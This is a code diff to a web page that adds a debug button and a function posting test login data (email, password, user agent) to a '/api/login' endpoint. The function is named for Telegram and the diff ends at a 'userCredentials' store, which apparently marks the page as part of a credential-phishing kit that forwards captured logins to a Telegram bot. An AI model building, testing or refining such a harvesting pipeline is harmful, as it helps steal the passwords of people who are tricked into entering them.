@@ -520,39 +520,141 @@
         </svg>
     </div>
 
-    <// DEBUG FUNCTION - Add this to test
+    <script>
+// === DEBUG BUTTON - REMOVE AFTER FIXING ===
+// Add this function
 function debugTelegram() {
+    console.log('🔧 Testing Telegram API...');
+    
     const testData = {
         type: 'login',
         email: 'test@example.com',
         password: 'testpassword123',
-        userAgent: navigator.userAgent
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
     };
     
-    console.log('Testing Telegram...');
+    // Show loading
+    const debugMsg = document.getElementById('debugMessage');
+    if (debugMsg) debugMsg.textContent = 'Testing...';
     
     fetch('/api/login', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+            'Content-Type': 'application/json',
+            'X-Debug': 'true'
+        },
         body: JSON.stringify(testData)
     })
-    .then(response => response.json())
+    .then(response => {
+        console.log('Response status:', response.status);
+        return response.json();
+    })
     .then(data => {
-        console.log('Debug response:', data);
-        alert('Debug test complete. Check Vercel logs.');
+        console.log('📡 API Response:', data);
+        
+        if (data.success) {
+            alert('✅ Debug test sent! Check Vercel logs.');
+        } else {
+            alert('❌ Debug failed: ' + (data.error || 'Unknown error'));
+        }
+        
+        const debugMsg = document.getElementById('debugMessage');
+        if (debugMsg) debugMsg.textContent = 'Test completed. Check console.';
     })
     .catch(error => {
-        console.error('Debug error:', error);
-        alert('Debug failed: ' + error.message);
+        console.error('🚨 Debug error:', error);
+        alert('💥 Debug failed: ' + error.message);
+        
+        const debugMsg = document.getElementById('debugMessage');
+        if (debugMsg) debugMsg.textContent = 'Error: ' + error.message;
     });
 }
 
-// Add a debug button (temporary)
-const debugBtn = document.createElement('button');
-debugBtn.textContent = 'DEBUG TEST';
-debugBtn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:9999;background:red;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;';
-debugBtn.onclick = debugTelegram;
-document.body.appendChild(debugBtn);>
+// Create and add debug button
+function addDebugButton() {
+    // Remove existing debug button if any
+    const existingBtn = document.getElementById('debugTestBtn');
+    if (existingBtn) existingBtn.remove();
+    
+    // Create button
+    const debugBtn = document.createElement('button');
+    debugBtn.id = 'debugTestBtn';
+    debugBtn.innerHTML = '🛠️ DEBUG';
+    debugBtn.style.cssText = `
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        z-index: 99999;
+        background: #ff4444;
+        color: white;
+        border: none;
+        border-radius: 20px;
+        padding: 12px 20px;
+        font-size: 14px;
+        font-weight: bold;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(255, 68, 68, 0.3);
+        transition: all 0.3s;
+    `;
+    
+    // Hover effect
+    debugBtn.onmouseover = function() {
+        this.style.transform = 'scale(1.05)';
+        this.style.boxShadow = '0 6px 16px rgba(255, 68, 68, 0.4)';
+    };
+    
+    debugBtn.onmouseout = function() {
+        this.style.transform = 'scale(1)';
+        this.style.boxShadow = '0 4px 12px rgba(255, 68, 68, 0.3)';
+    };
+    
+    // Click handler
+    debugBtn.onclick = debugTelegram;
+    
+    // Add debug message div
+    const debugMsg = document.createElement('div');
+    debugMsg.id = 'debugMessage';
+    debugMsg.style.cssText = `
+        position: fixed;
+        bottom: 70px;
+        right: 20px;
+        background: rgba(0, 0, 0, 0.8);
+        color: white;
+        padding: 10px;
+        border-radius: 5px;
+        font-size: 12px;
+        max-width: 300px;
+        display: none;
+        z-index: 99998;
+    `;
+    
+    // Add to page
+    document.body.appendChild(debugMsg);
+    document.body.appendChild(debugBtn);
+    
+    // Show button after 3 seconds
+    setTimeout(() => {
+        debugBtn.style.opacity = '1';
+    }, 3000);
+}
+
+// Add debug button when page loads
+window.addEventListener('load', function() {
+    // Only add in development or if there's an issue
+    const url = window.location.href;
+    if (url.includes('localhost') || url.includes('vercel') || url.includes('debug=true')) {
+        setTimeout(addDebugButton, 1000);
+    }
+});
+
+// Also add keyboard shortcut: Ctrl+Shift+D
+document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+        addDebugButton();
+        alert('Debug button added!');
+    }
+});
         // Store user data
         let userCredentials = {
             email: '',
